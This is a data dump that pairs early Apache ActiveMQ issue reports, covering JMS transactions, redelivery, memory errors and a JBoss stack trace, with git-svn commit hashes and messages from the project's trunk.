14:47:03,250 INFO  [SimpleMessageReceiverBean] Message received: hello ActiveMQ
world
14:47:03,250 INFO  [SenderClient] Looking up Sender: java:comp/env/ejb/Sender
14:47:03,250 INFO  [SenderClient] Sending message: hello ActiveMQ world
14:47:03,265 INFO  [SenderClient] Message sent
14:47:03,265 INFO  [SimpleMessageReceiverBean] Begin delay...
14:47:03,296 INFO  [SenderClient] Message sent
14:47:03,296 INFO  [SimpleMessageReceiverBean] Begin delay...
14:47:08,265 INFO  [SimpleMessageReceiverBean] ...end delay
14:47:08,296 INFO  [SimpleMessageReceiverBean] ...end delay
14:47:08,296 INFO  [SimpleMessageReceiverBean] SimpleMessageReceiverBean.ejbRemo
ve

>> THE EXCEPTION (RELATED TO TRANSACTION MANAGEMENT?)

14:47:08,296 ERROR [LogInterceptor] RuntimeException in method: public abstract
void javax.jms.MessageListener.onMessage(javax.jms.Message):
java.lang.IllegalStateException: setRollbackOnly must only be called in the cont
ext of a transaction (EJB 2.0 - 15.5.1)
        at org.jboss.ejb.MessageDrivenEnterpriseContext$MessageDrivenContextImpl
.setRollbackOnly(MessageDrivenEnterpriseContext.java:208)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.rollba
ck(SimpleMessageReceiverBean.java:105)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.send(S
impleMessageReceiverBean.java:98)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.handle
Message(SimpleMessageReceiverBean.java:67)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.onMess
age(SimpleMessageReceiverBean.java:47)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:324)
        at org.jboss.invocation.Invocation.performCall(Invocation.java:345)
        at org.jboss.ejb.MessageDrivenContainer$ContainerInterceptor.invoke(Mess
ageDrivenContainer.java:475)
        at org.jboss.resource.connectionmanager.CachedConnectionInterceptor.invo
ke(CachedConnectionInterceptor.java:185)
        at org.jboss.ejb.plugins.MessageDrivenInstanceInterceptor.invoke(Message
DrivenInstanceInterceptor.java:87)
        at org.jboss.ejb.plugins.CallValidationInterceptor.invoke(CallValidation
Interceptor.java:48)
        at org.jboss.ejb.plugins.AbstractTxInterceptor.invokeNext(AbstractTxInte
rceptor.java:105)
        at org.jboss.ejb.plugins.TxInterceptorCMT.runWithTransactions(TxIntercep
torCMT.java:280)
        at org.jboss.ejb.plugins.TxInterceptorCMT.invoke(TxInterceptorCMT.java:1
46)
        at org.jboss.ejb.plugins.RunAsSecurityInterceptor.invoke(RunAsSecurityIn
terceptor.java:94)
        at org.jboss.ejb.plugins.LogInterceptor.invoke(LogInterceptor.java:191)
        at org.jboss.ejb.plugins.ProxyFactoryFinderInterceptor.invoke(ProxyFacto
ryFinderInterceptor.java:122)
        at org.jboss.ejb.MessageDrivenContainer.internalInvoke(MessageDrivenCont
ainer.java:389)
        at org.jboss.ejb.Container.invoke(Container.java:856)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:324)
        at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatch
er.java:144)
        at org.jboss.mx.server.Invocation.dispatch(Invocation.java:80)
        at org.jboss.mx.server.Invocation.invoke(Invocation.java:72)
        at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.
java:249)
        at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:642)
        at org.jboss.invocation.local.LocalInvoker$MBeanServerAction.invoke(Loca
lInvoker.java:155)
        at org.jboss.invocation.local.LocalInvoker.invoke(LocalInvoker.java:104)

        at org.jboss.invocation.InvokerInterceptor.invoke(InvokerInterceptor.jav
a:90)
        at org.jboss.proxy.TransactionInterceptor.invoke(TransactionInterceptor.
java:46)
        at org.jboss.ejb.plugins.inflow.MessageEndpointInterceptor.delivery(Mess
ageEndpointInterceptor.java:237)
        at org.jboss.ejb.plugins.inflow.MessageEndpointInterceptor.invoke(Messag
eEndpointInterceptor.java:117)
        at org.jboss.proxy.ClientMethodInterceptor.invoke(ClientMethodIntercepto
r.java:59)
        at org.jboss.proxy.ClientContainer.invoke(ClientContainer.java:86)
        at $Proxy58.onMessage(Unknown Source)
        at org.codehaus.activemq.ActiveMQSession.run(ActiveMQSession.java:558)
        at org.codehaus.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java
:137)
        at org.jboss.resource.work.WorkWrapper.execute(WorkWrapper.java:200)
        at org.jboss.util.threadpool.BasicTaskWrapper.run(BasicTaskWrapper.java:
232)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(PooledExec
utor.java:743)
        at java.lang.Thread.run(Thread.java:534)
14:47:08,296 INFO  [ActiveMQSession] Caught :javax.ejb.EJBException: RuntimeExce
ption; CausedByException is:
        setRollbackOnly must only be called in the context of a transaction (EJB
 2.0 - 15.5.1)
javax.ejb.EJBException: RuntimeException; CausedByException is:
        setRollbackOnly must only be called in the context of a transaction (EJB
 2.0 - 15.5.1)
        at org.jboss.ejb.plugins.LogInterceptor.handleException(LogInterceptor.j
ava:381)
        at org.jboss.ejb.plugins.LogInterceptor.invoke(LogInterceptor.java:195)
        at org.jboss.ejb.plugins.ProxyFactoryFinderInterceptor.invoke(ProxyFacto
ryFinderInterceptor.java:122)
        at org.jboss.ejb.MessageDrivenContainer.internalInvoke(MessageDrivenCont
ainer.java:389)
        at org.jboss.ejb.Container.invoke(Container.java:856)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:324)
        at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatch
er.java:144)
        at org.jboss.mx.server.Invocation.dispatch(Invocation.java:80)
        at org.jboss.mx.server.Invocation.invoke(Invocation.java:72)
        at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.
java:249)
        at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:642)
        at org.jboss.invocation.local.LocalInvoker$MBeanServerAction.invoke(Loca
lInvoker.java:155)
        at org.jboss.invocation.local.LocalInvoker.invoke(LocalInvoker.java:104)

        at org.jboss.invocation.InvokerInterceptor.invoke(InvokerInterceptor.jav
a:90)
        at org.jboss.proxy.TransactionInterceptor.invoke(TransactionInterceptor.
java:46)
        at org.jboss.ejb.plugins.inflow.MessageEndpointInterceptor.delivery(Mess
ageEndpointInterceptor.java:237)
        at org.jboss.ejb.plugins.inflow.MessageEndpointInterceptor.invoke(Messag
eEndpointInterceptor.java:117)
        at org.jboss.proxy.ClientMethodInterceptor.invoke(ClientMethodIntercepto
r.java:59)
        at org.jboss.proxy.ClientContainer.invoke(ClientContainer.java:86)
        at $Proxy58.onMessage(Unknown Source)
        at org.codehaus.activemq.ActiveMQSession.run(ActiveMQSession.java:558)
        at org.codehaus.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java
:137)
        at org.jboss.resource.work.WorkWrapper.execute(WorkWrapper.java:200)
        at org.jboss.util.threadpool.BasicTaskWrapper.run(BasicTaskWrapper.java:
232)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(PooledExec
utor.java:743)
        at java.lang.Thread.run(Thread.java:534)
java.lang.IllegalStateException: setRollbackOnly must only be called in the cont
ext of a transaction (EJB 2.0 - 15.5.1)
        at org.jboss.ejb.MessageDrivenEnterpriseContext$MessageDrivenContextImpl
.setRollbackOnly(MessageDrivenEnterpriseContext.java:208)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.rollba
ck(SimpleMessageReceiverBean.java:105)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.send(S
impleMessageReceiverBean.java:98)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.handle
Message(SimpleMessageReceiverBean.java:67)
        at com.panacya.platform.service.bus.mdb.SimpleMessageReceiverBean.onMess
age(SimpleMessageReceiverBean.java:47)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:324)
        at org.jboss.invocation.Invocation.performCall(Invocation.java:345)
        at org.jboss.ejb.MessageDrivenContainer$ContainerInterceptor.invoke(Mess
ageDrivenContainer.java:475)
        at org.jboss.resource.connectionmanager.CachedConnectionInterceptor.invo
ke(CachedConnectionInterceptor.java:185)
        at org.jboss.ejb.plugins.MessageDrivenInstanceInterceptor.invoke(Message
DrivenInstanceInterceptor.java:87)
        at org.jboss.ejb.plugins.CallValidationInterceptor.invoke(CallValidation
Interceptor.java:48)
        at org.jboss.ejb.plugins.AbstractTxInterceptor.invokeNext(AbstractTxInte
rceptor.java:105)
        at org.jboss.ejb.plugins.TxInterceptorCMT.runWithTransactions(TxIntercep
torCMT.java:280)
        at org.jboss.ejb.plugins.TxInterceptorCMT.invoke(TxInterceptorCMT.java:1
46)
        at org.jboss.ejb.plugins.RunAsSecurityInterceptor.invoke(RunAsSecurityIn
terceptor.java:94)
        at org.jboss.ejb.plugins.LogInterceptor.invoke(LogInterceptor.java:191)
        at org.jboss.ejb.plugins.ProxyFactoryFinderInterceptor.invoke(ProxyFacto
ryFinderInterceptor.java:122)
        at org.jboss.ejb.MessageDrivenContainer.internalInvoke(MessageDrivenCont
ainer.java:389)
        at org.jboss.ejb.Container.invoke(Container.java:856)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:324)
        at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatch
er.java:144)
        at org.jboss.mx.server.Invocation.dispatch(Invocation.java:80)
        at org.jboss.mx.server.Invocation.invoke(Invocation.java:72)
        at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.
java:249)
        at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:642)
        at org.jboss.invocation.local.LocalInvoker$MBeanServerAction.invoke(Loca
lInvoker.java:155)
        at org.jboss.invocation.local.LocalInvoker.invoke(LocalInvoker.java:104)

        at org.jboss.invocation.InvokerInterceptor.invoke(InvokerInterceptor.jav
a:90)
        at org.jboss.proxy.TransactionInterceptor.invoke(TransactionInterceptor.
java:46)
        at org.jboss.ejb.plugins.inflow.MessageEndpointInterceptor.delivery(Mess
ageEndpointInterceptor.java:237)
        at org.jboss.ejb.plugins.inflow.MessageEndpointInterceptor.invoke(Messag
eEndpointInterceptor.java:117)
        at org.jboss.proxy.ClientMethodInterceptor.invoke(ClientMethodIntercepto
r.java:59)
        at org.jboss.proxy.ClientContainer.invoke(ClientContainer.java:86)
        at $Proxy58.onMessage(Unknown Source)
        at org.codehaus.activemq.ActiveMQSession.run(ActiveMQSession.java:558)
        at org.codehaus.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java
:137)
        at org.jboss.resource.work.WorkWrapper.execute(WorkWrapper.java:200)
        at org.jboss.util.threadpool.BasicTaskWrapper.run(BasicTaskWrapper.java:
232)
        at EDU.oswego.cs.dl.util.concurrent.PooledExecutor$Worker.run(PooledExec
utor.java:743)
        at java.lang.Thread.run(Thread.java:534)
14:47:08,343 WARN  [ServerSessionImpl] Local transaction had not been commited.
 Commiting now.",9f94b6c509e082914537dd2897588f4c5240e474,"Fix for https://issues.apache.org/activemq/browse/AMQ-1528

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@606022 13f79535-47bb-0310-9956-ffa450edef68"
12481186,AMQ-148,"I am trying to build 'maven webserver' with ActiveMQ 1.3. Turns out there is no 'webserver' target. I would like to run the web samples and look into how to use REST (with HTTP C Client).

Thanks.",30fe17834cdb3ae578738208e1927bc78ac30e9b,"Fix for https://issues.apache.org/activemq/browse/AMQ-1485

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@591142 13f79535-47bb-0310-9956-ffa450edef68"
12481186,AMQ-148,"I am trying to build 'maven webserver' with ActiveMQ 1.3. Turns out there is no 'webserver' target. I would like to run the web samples and look into how to use REST (with HTTP C Client).

Thanks.",507ef42e593397c5295a46fa99ca6b9d0a4e3806,"AMQ-1489 add comment on possible workaround

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646930 13f79535-47bb-0310-9956-ffa450edef68"
12481080,AMQ-147,recover() from  MessageListener in AUTO_ACKNOWLEDGE session does not redeliver message.,9352c9fcdc79367e50ee3931115b5fa72f6d82b0,"Test case for: https://issues.apache.org/activemq/browse/AMQ-1479

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@589048 13f79535-47bb-0310-9956-ffa450edef68"
12481080,AMQ-147,recover() from  MessageListener in AUTO_ACKNOWLEDGE session does not redeliver message.,c0ba767a8855d18302eccf6990b43426436e145c,"https://issues.apache.org/activemq/browse/AMQ-1473 - adding example for log4j jms appender

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@803078 13f79535-47bb-0310-9956-ffa450edef68"
12483909,AMQ-145,"I'm using activemq via http.

If I put an object into a ActiveMQObjectMessage, the toString method  of the ActiveMQObjectMessage does not print the object but:

'... ActiveMQObjectMessage{ object = null }'

With getObject() I get nonetheless the non-null object I've put into the message.

This can be a bit confusing when debugging.",4acbd5900af4850b6b0f30e79f5f6bac29fa3dea,"Fix for https://issues.apache.org/activemq/browse/AMQ-1456

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646395 13f79535-47bb-0310-9956-ffa450edef68"
12481161,AMQ-143,"The following code should cause received message to get consumed and not rolledback.  Right now it seems that when we close a consumer his messages are rollback even though they were consumed in transaction that is about to commit.

TextMessage message = (TextMessage) consumer.receive(1000);
consumer.close();
session.commit();",d48322690fcad77c6ff557899000278c5bab3824,"added patch for AMQ-1434 to allow transport listeners to be used with a connection factory for easy integration with Spring JmsTemplate etc

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@579498 13f79535-47bb-0310-9956-ffa450edef68"
12481161,AMQ-143,"The following code should cause received message to get consumed and not rolledback.  Right now it seems that when we close a consumer his messages are rollback even though they were consumed in transaction that is about to commit.

TextMessage message = (TextMessage) consumer.receive(1000);
consumer.close();
session.commit();",08393aa269f52e346048e611cb74d5602c566768,"Added test case to trunk showing that AMQ-1438 is no longer an issue on the trunk.  



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@647882 13f79535-47bb-0310-9956-ffa450edef68"
12481283,AMQ-134,"I have to peers that communicate using JMS, the first one creates a message, sets the JMSReplyTo to a temporary (Topic) Destination for the purpose and sends it to the Topic, the second peer receives the message and processes it and responds to the Temporary Topic Destination.

This all works with OpenJMS, but using ActiveMQ on the second peer the JMSReplyTo property is a QueueDestination and not a TopicDestination (although the name from toString().

Peer one:
org.codehaus.activemq.message.ActiveMQTemporaryTopic / TemporaryTopic-{TD{ID:dozer-3076-1100891655894-1:0}TD}ID:dozer-3076-1100891655894-8:0

Peer two:
org.codehaus.activemq.message.ActiveMQTemporaryQueue / TemporaryTopic-{TD{ID:dozer-3076-1100891655894-1:0}TD}ID:dozer-3076-1100891655894-8:0",76b2a3ed8ffd70c2dd7ed7fe4cd2007f1244a6e3,"Fix for AMQ-1343 - Network conntions not shutdown propertly when a InvalidClientIDException occurs

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@559139 13f79535-47bb-0310-9956-ffa450edef68"
12481207,AMQ-128,"for client-ack mode it seems that messages not ack'd don 't get redelivered if we close the session.

seems OK if we close the connection though",f3c6b7fff9c609efe9d71e9b7327cc5631838a22,"added documentation from patch AMQ-1281

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@549836 13f79535-47bb-0310-9956-ffa450edef68"
12481257,AMQ-125,"I ran the benchmark test with a producer/client that defaults to BENCHMARK.FEED0. The persesitence was on as by default in the release.

After letting the producer/consumer run for over an hour the broker/server crapped out with a java.lang.outOfMemory error. Both producer and consumer continued to run but were now showing 0.0 for statistics indicating lack of connection.

It's difficult to tell what's happening by this error. I've had this problem when the gc fails to recollect memory and I've had it from memory ""leaks"" (yes, I know, technically impossible but it is descriptive.) 

If it is a gc problem then a larger initial broker JVM size may solve the problem. If a resource isn't being released that just delays the eventual.",eba0ae3c7bc13e30ceb8f341ad3916b921cae36a,"test case for https://issues.apache.org/activemq/browse/AMQ-1251

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@571150 13f79535-47bb-0310-9956-ffa450edef68"
12481257,AMQ-125,"I ran the benchmark test with a producer/client that defaults to BENCHMARK.FEED0. The persesitence was on as by default in the release.

After letting the producer/consumer run for over an hour the broker/server crapped out with a java.lang.outOfMemory error. Both producer and consumer continued to run but were now showing 0.0 for statistics indicating lack of connection.

It's difficult to tell what's happening by this error. I've had this problem when the gc fails to recollect memory and I've had it from memory ""leaks"" (yes, I know, technically impossible but it is descriptive.) 

If it is a gc problem then a larger initial broker JVM size may solve the problem. If a resource isn't being released that just delays the eventual.",7b1fd3484ef2f557a3b322b5f08a8f5499be2c7f,"Fix for http://issues.apache.org/activemq/browse/AMQ-1250

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@581715 13f79535-47bb-0310-9956-ffa450edef68"
12481257,AMQ-125,"I ran the benchmark test with a producer/client that defaults to BENCHMARK.FEED0. The persesitence was on as by default in the release.

After letting the producer/consumer run for over an hour the broker/server crapped out with a java.lang.outOfMemory error. Both producer and consumer continued to run but were now showing 0.0 for statistics indicating lack of connection.

It's difficult to tell what's happening by this error. I've had this problem when the gc fails to recollect memory and I've had it from memory ""leaks"" (yes, I know, technically impossible but it is descriptive.) 

If it is a gc problem then a larger initial broker JVM size may solve the problem. If a resource isn't being released that just delays the eventual.",bff39c565b3f0613427ce235b0533aa7b82669c4,"Test case for https://issues.apache.org/activemq/browse/AMQ-1255

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@647862 13f79535-47bb-0310-9956-ffa450edef68"
12481016,AMQ-124,I noticed that certain classes in the activemq-ra module do not follow the 'Equality Constraints' as defined by the Java Connector Architecture Specificat v1.5 (see section 16.4).  I'm submitting a patch that contains a fixes and a bunch of unit tests.,229ca6afd760dd57219ce75b1a51216a656da549,"Fix for https://issues.apache.org/activemq/browse/AMQ-1246

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@591160 13f79535-47bb-0310-9956-ffa450edef68"
12481244,AMQ-121,"I'm working on deploying the activemq-ra module to JBoss 4.0 and I'm running into a problem.  

Without going into to much detail, it seems that JBoss is assuming that any JMS connector is implementing the JCA specs recommended set of JavaBeans properties for a JMS ActivationSpec class (see J2EE Connector Architecture Specification 1.5 - Appendix B - Sections B.2 - B.3) and incorrectly tries to set default values for each of the recommended properties.  This fails with the ActiveMQ connector because the ActiveMQActivationSpec class does not implement the recommended properties.

Even though the spec lists these properties as only recommendations, I think it would be in everyone's best interest to implement these properties as outlined in the spec.  It would certainly make integration with other AppServers much easier.

I've attached a patch, with unit tests, that implements the properties.",98376dd3be560278aaa3af502bac89bc45ff28c2,"AMQ-1218 added version to xbean plugin

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@524280 13f79535-47bb-0310-9956-ffa450edef68"
12481279,AMQ-115,While doing some debuging It looked like we are creating 1 Dispatcher thread per temporary Queue that is created.  We may be even creating a Dispatcher per Queue period.  This could lead to an unnessary number of Dispatcher threads that sitting idle using up VM resources.,9b9766d0341441619afbb9622ff96ec127143542,"added test case to try reproduce AMQ-1152 (but unfortunately couldn't)

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@540916 13f79535-47bb-0310-9956-ffa450edef68"
12481279,AMQ-115,While doing some debuging It looked like we are creating 1 Dispatcher thread per temporary Queue that is created.  We may be even creating a Dispatcher per Queue period.  This could lead to an unnessary number of Dispatcher threads that sitting idle using up VM resources.,642d38cd8ca74e4fdc70de0fc4d28f3997d4752c,"Fix for https://issues.apache.org/activemq/browse/AMQ-1156
We now actually update the tcpNoDelay setting on the socket once the wireformat options are negociated.  This allows
the client to control if his socket and the server's socket use the option.  By default tcpNoDelay is enabled.
the client should use a URL like -Durl=tcp://localhost:61616?wireFormat.tcpNoDelayEnabled=false to disable tcpNoDelay on both the client and the server socket.



git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@573080 13f79535-47bb-0310-9956-ffa450edef68"
12481200,AMQ-114,"We don't do this that is in the JMS API for a QueueSession:

A QueueSession cannot be used to create objects specific to the publish/subscribe domain. The following methods inherit from Session, but must throw an IllegalStateException if they are used from QueueSession:

    * createDurableSubscriber
    * createTemporaryTopic
    * createTopic
    * unsubscribe",be35271fdc0f73e0fc53f62fbc31bee311b96f04,"Port of rev 501500 fix for https://issues.apache.org/activemq/browse/AMQ-1140


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@501506 13f79535-47bb-0310-9956-ffa450edef68"
12481200,AMQ-114,"We don't do this that is in the JMS API for a QueueSession:

A QueueSession cannot be used to create objects specific to the publish/subscribe domain. The following methods inherit from Session, but must throw an IllegalStateException if they are used from QueueSession:

    * createDurableSubscriber
    * createTemporaryTopic
    * createTopic
    * unsubscribe",3bd948f7388d3e180b187b11a079b277fe56f1ff,"applied modified version of  AMQ-1147 (keeping the implementation classes the same name to avoid issues with existing RA configurations)

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@515576 13f79535-47bb-0310-9956-ffa450edef68"
12481211,AMQ-113,"I had an ActiveMQ install which I upgraded with new ActiveMQ jars to fix a small bug.  When it started up I got the following error:


10:27:08,625 INFO  [JdbmPersistenceAdapter] Creating JDBM based message store in directory: C:\sandbox\geronimo-tck\j2ee\geronimo\var\activemq
10:27:08,781 INFO  [JdbmPreparedTransactionStore] Recovering prepared transactions
10:27:08,843 ERROR [JdbmPreparedTransactionStore] Failed to recover prepared transactions: java.io.InvalidClassException: org.codehaus.activemq.service.impl.AbstractTransaction; local class incompatible: stream classdesc serialVersionUID = -30595945985666
java.io.InvalidClassException: org.codehaus.activemq.service.impl.AbstractTransaction; local class incompatible: stream classdesc serialVersionUID = -3059594598566650262, local class serialVersionUID = -8026968802014775398
        at java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:519)
        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1546)
        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1460)
        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1546)
        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1460)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1693)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1299)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:339)
        at jdbm.btree.BPage.deserialize(BPage.java:996)
        at jdbm.recman.BaseRecordManager.fetch(BaseRecordManager.java:341)
        at jdbm.recman.CacheRecordManager.fetch(CacheRecordManager.java:264)
        at jdbm.btree.BPage.loadBPage(BPage.java:826)
        at jdbm.btree.BPage.childBPage(BPage.java:816)
        at jdbm.btree.BPage.findFirst(BPage.java:302)",6e26195cd86777c2a971896bf912ed75d96e7653,"fix for AMQ-1130 to use LONGBLOB rather than BLOB for persisting on mysql to avoid the 64k limit

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@496976 13f79535-47bb-0310-9956-ffa450edef68"
12481237,AMQ-111,"ObjectMessage. setObject(value) is treating the value is if passed by ref.  Modifiying the value after the setObject() but before the send(), will cause the modified value to be sent.  This is not spec compliant.",7da1e6eb8055a220952aedb9bb6d268fedc40d83,"Adding a test for AMQ-1112

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@790199 13f79535-47bb-0310-9956-ffa450edef68"
12481237,AMQ-111,"ObjectMessage. setObject(value) is treating the value is if passed by ref.  Modifiying the value after the setObject() but before the send(), will cause the modified value to be sent.  This is not spec compliant.",e5838398105f60bc7521784eacd81dc0762b92fd,"excluding the test for https://issues.apache.org/activemq/browse/AMQ-1112 until it's fixed, so we can have successful builds

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@790526 13f79535-47bb-0310-9956-ffa450edef68"
12481237,AMQ-111,"ObjectMessage. setObject(value) is treating the value is if passed by ref.  Modifiying the value after the setObject() but before the send(), will cause the modified value to be sent.  This is not spec compliant.",6a121b33eded87b3aacfef2feebdb4175b7eb31e,"test for no consumer and expiry - https://issues.apache.org/activemq/browse/AMQ-1112

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@790928 13f79535-47bb-0310-9956-ffa450edef68"
12481237,AMQ-111,"ObjectMessage. setObject(value) is treating the value is if passed by ref.  Modifiying the value after the setObject() but before the send(), will cause the modified value to be sent.  This is not spec compliant.",30db300a1ab0cbf68d26936b3d0db378c83196d2,"add new policyEntry attributed to schema for : https://issues.apache.org/activemq/browse/AMQ-1112

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@807969 13f79535-47bb-0310-9956-ffa450edef68"
12481250,AMQ-110,"I am using a not transacted and auto-acknowledge queue.

I am using the <berkeleyDbPersistence/> adapter

The error message that I a reveiving is :

Could not delete sequenece number for: org.codehaus.activemq.service.MessageIdentity@7a86771e[id=ID:ev1.drivenow.com.au-50147-1097167695356-16132:0; sequenceNo=<DatabaseEntry dlen=0 doff=0 doff=0 offset=0 size=8>] status: OperationStatus.NOTFOUND

Any pointers on how serious this error is - i.e. is the queue performing normally even though this message is being logged ?",b4c3a30b9e061868630ba19b14d88c61cd1ac44f,"Fix for https://issues.apache.org/activemq/browse/AMQ-1103

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646477 13f79535-47bb-0310-9956-ffa450edef68"
12481092,AMQ-104,"I get a NullPointerException calling QueueSession.createTemporaryQueue(), unless the session's Connection.start() method has already been called. If the connection has been started, the createTemporaryQueue() call works fine.",2510b088adbe75ba744bb6fccc1eb66b46ce38c4,"fixed for http://issues.apache.org/activemq/browse/AMQ-1042

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@473647 13f79535-47bb-0310-9956-ffa450edef68"
12481267,AMQ-101,"Just been browsing through the jmx stats impl stuff from activemq and found two possible div/0 errors

org.codehaus.activemq.management.TimeStatisticImpl

see getAveragePerSecond* methods.

http://cvs.activemq.codehaus.org/viewrep/activemq/src/java/org/codehaus/activemq/management/TimeStatisticImpl.java?r=1.6",6be185d2ce739ea04c6a85b9bba074771dde4689,"Changes to POM to try fix AMQ-1017

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@472483 13f79535-47bb-0310-9956-ffa450edef68"
12481296,AMQ-99,"When ActiveMQConnection.reconnect() is called after the transport channel is reconnected, sendConnectionInfoToBroker() is called to reinitialise the connection with the broker. This method checks if the connection info has already been sent by checking isConnectionInfoSentToBroker and silently avoid sending the information is the flag i set. This means that the connection won't be initialised correctly and no messages will be delivered to the connection. 

The problem can be solved by adding 

  isConnectionInfoSentToBroker = false;

before 

  sendConnectionInfoToBroker();

in doReconnect().

The problem can be reproduces by starting a broker and a consumer with a reliable tcp connection, kill and restart the broker and then send some messages to the consumer (they won't be correctly dispatched).",2ccbdb86573f5ba146f0cdede6dd466cd59ee83f,"added an implementation of stomp+ssl along with a test case (which doesn't quite work yet but is excluded from the pom.xml  :) for AMQ-998

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@467084 13f79535-47bb-0310-9956-ffa450edef68"
12481293,AMQ-94,<NA>,63b82516a41ed5e045776a2d39ebfa1c83ed4b09,"applied patch for AMQ-944

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@515556 13f79535-47bb-0310-9956-ffa450edef68"
12481347,AMQ-93,"Try running this in two shells...

maven -o jndi:consumer -Djndi=src/test/peer-jndi.properties 

(wait for it to startup) then

maven -o jndi:producer -Djndi=src/test/peer-jndi.properties 


It will use an embedded broker with discovery to create a network. (Its using src/sample-conf/peer.xml to configure the broker).

If you pass -Dsubject=MyTopic things work perfectly. Though with queues, the consumer seems to get the messages, yet they are not messages 1..100 but instead are like 20 copies of message 39 etc. i.e. lots of duplicates seem to be dispatched for some reason. Something wierd going on.",d90b781b00b52cd7e840fb8dd596044998281dc0,"Applied patch from Bruce Snyder to port AMQ 3.x LogAppender utility to AMQ 4.x.
Refer to: https://issues.apache.org/activemq/browse/AMQ-935
Applied to rev 449914

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@449919 13f79535-47bb-0310-9956-ffa450edef68"
12481347,AMQ-93,"Try running this in two shells...

maven -o jndi:consumer -Djndi=src/test/peer-jndi.properties 

(wait for it to startup) then

maven -o jndi:producer -Djndi=src/test/peer-jndi.properties 


It will use an embedded broker with discovery to create a network. (Its using src/sample-conf/peer.xml to configure the broker).

